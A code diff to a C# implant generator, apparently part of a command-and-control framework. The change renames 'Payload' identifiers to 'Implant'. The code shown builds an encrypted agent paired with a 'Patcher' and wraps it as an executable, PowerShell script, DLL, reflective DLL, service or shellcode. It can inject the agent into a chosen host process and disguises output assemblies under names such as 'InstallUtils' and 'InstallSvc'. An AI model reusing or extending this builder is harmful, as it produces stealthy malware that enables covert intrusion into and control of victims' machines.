@@ -9,12 +9,6 @@ namespace Common.Payload;
 using System.IO;
 using Common.Config;
 
-//public enum MessageLevel
-//{
-//    Default,
-//    Verbose
-//}
-
 public partial class PayloadGenerator
 {
     public const string AgentSrcFile = "Agent.exe";
@@ -35,11 +29,11 @@ public partial class PayloadGenerator
         this.Spawn = spawn;
     }
 
-    private string Source(string fileName, PayloadArchitecture arch, bool debug)
+    private string Source(string fileName, ImplantArchitecture arch, bool debug)
     {
         if(debug)
-            return Path.Combine(this.Config.PayloadTemplatesFolder, "debug", fileName);
-        return Path.Combine(this.Config.PayloadTemplatesFolder, arch.ToString(), fileName);
+            return Path.Combine(this.Config.ImplantTemplatesFolder, "debug", fileName);
+        return Path.Combine(this.Config.ImplantTemplatesFolder, arch.ToString(), fileName);
     }
 
     private string Working(string fileName)
@@ -47,34 +41,34 @@ public partial class PayloadGenerator
         return Path.Combine(this.Config.WorkingFolder, fileName);
     }
 
-    public byte[] GeneratePayload(PayloadGenerationOptions options)
+    public byte[] GenerateImplant(ImplantConfig options)
     {
         byte[] agentbytes = null;
-        if (options.IsInjected  && options.Type != PayloadType.Library)
+        if (options.IsInjected  && options.Type != ImplantType.Library)
         {
             agentbytes = PrepareAgent(options, false);
-            agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == PayloadType.Service);
+            agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == ImplantType.Service);
         }
         else
         {
-            agentbytes = PrepareAgent(options, options.Type == PayloadType.Service);
+            agentbytes = PrepareAgent(options, options.Type == ImplantType.Service);
         }
 
         switch (options.Type)
         {
-            case PayloadType.Executable: return this.ExecutableEncapsulation(options, agentbytes);
-            case PayloadType.PowerShell: return this.PowershellEncapsulation(options, agentbytes);
-            case PayloadType.Library: return this.LibraryEncapsulation(options,agentbytes);
-            case PayloadType.ReflectiveLibrary: return this.ReflectiveLibraryEncapsulation(options, agentbytes);
-            case PayloadType.Service: return agentbytes;
-            case PayloadType.Binary: return this.BinaryEncapsulation(options, agentbytes);
+            case ImplantType.Executable: return this.ExecutableEncapsulation(options, agentbytes);
+            case ImplantType.PowerShell: return this.PowershellEncapsulation(options, agentbytes);
+            case ImplantType.Library: return this.LibraryEncapsulation(options,agentbytes);
+            case ImplantType.ReflectiveLibrary: return this.ReflectiveLibraryEncapsulation(options, agentbytes);
+            case ImplantType.Service: return agentbytes;
+            case ImplantType.Shellcode: return this.BinaryEncapsulation(options, agentbytes);
             default:
                 throw new NotImplementedException();
 
         }
     }
 
-    public byte[] ExecutableEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    public byte[] ExecutableEncapsulation(ImplantConfig options, byte[] agent)
     {
         var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
         File.WriteAllBytes(agentPath, agent);
@@ -110,7 +104,7 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] BinaryEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    public byte[] BinaryEncapsulation(ImplantConfig options, byte[] agent)
     {
         var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
         File.WriteAllBytes(agentPath, agent);
@@ -119,7 +113,7 @@ public partial class PayloadGenerator
         var outPath = this.Working(outFile);
 
         this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
-        var executionResult = this.GenerateBin(agentPath, outPath, options.Architecture == PayloadArchitecture.x86);
+        var executionResult = this.GenerateBin(agentPath, outPath, options.Architecture == ImplantArchitecture.x86);
 
         if (options.IsVerbose)
         {
@@ -144,7 +138,7 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] LibraryEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    public byte[] LibraryEncapsulation(ImplantConfig options, byte[] agent)
     {
         var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
         File.WriteAllBytes(agentPath, agent);
@@ -180,7 +174,7 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] ReflectiveLibraryEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    public byte[] ReflectiveLibraryEncapsulation(ImplantConfig options, byte[] agent)
     {
         var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
         File.WriteAllBytes(agentPath, agent);
@@ -216,7 +210,7 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] PowershellEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    public byte[] PowershellEncapsulation(ImplantConfig options, byte[] agent)
     {
         string psSourceCode = string.Empty;
         using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture, options.IsDebug)))
@@ -244,7 +238,7 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] PrepareAgent(PayloadGenerationOptions options, bool isService)
+    public byte[] PrepareAgent(ImplantConfig options, bool isService)
     {
         //Console.WriteLine("Generating encrypted Agent");
 
@@ -286,7 +280,7 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Implant", Encoding.UTF8.GetBytes(agentb64) },
                         { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
@@ -303,7 +297,7 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Implant", Encoding.UTF8.GetBytes(agentb64) },
                         { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
@@ -315,7 +309,7 @@ public partial class PayloadGenerator
         }
     }
 
-    public byte[] PrepareInjectedAgent(PayloadGenerationOptions options, byte[] agent, bool isService)
+    public byte[] PrepareInjectedAgent(ImplantConfig options, byte[] agent, bool isService)
     {
         #region binary
         var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
@@ -326,7 +320,7 @@ public partial class PayloadGenerator
         var outPath = this.Working(outFile);
 
         this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
-        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);
+        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == ImplantArchitecture.x86);
 
         if (options.IsVerbose)
         {
@@ -358,13 +352,13 @@ public partial class PayloadGenerator
 
         var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));
 
-        string process = options.Architecture == PayloadArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86;
+        string process = options.Architecture == ImplantArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86;
         if(!string.IsNullOrEmpty(options.InjectionProcess))
             process = options.InjectionProcess;
 
         injDll = AssemblyEditor.ReplaceRessources(injDll, new Dictionary<string, object>()
                     {
-                        { "Payload", binBytes },
+                        { "Implant", binBytes },
                         { "Host",  process},
                         { "Delay", options.InjectionDelay.ToString() },
                     });
@@ -381,7 +375,7 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
+                        { "Implant", Encoding.UTF8.GetBytes(injectb64) },
                         { "Key", encInject.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
@@ -396,7 +390,7 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
+                        { "Implant", Encoding.UTF8.GetBytes(injectb64) },
                         { "Key", encInject.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
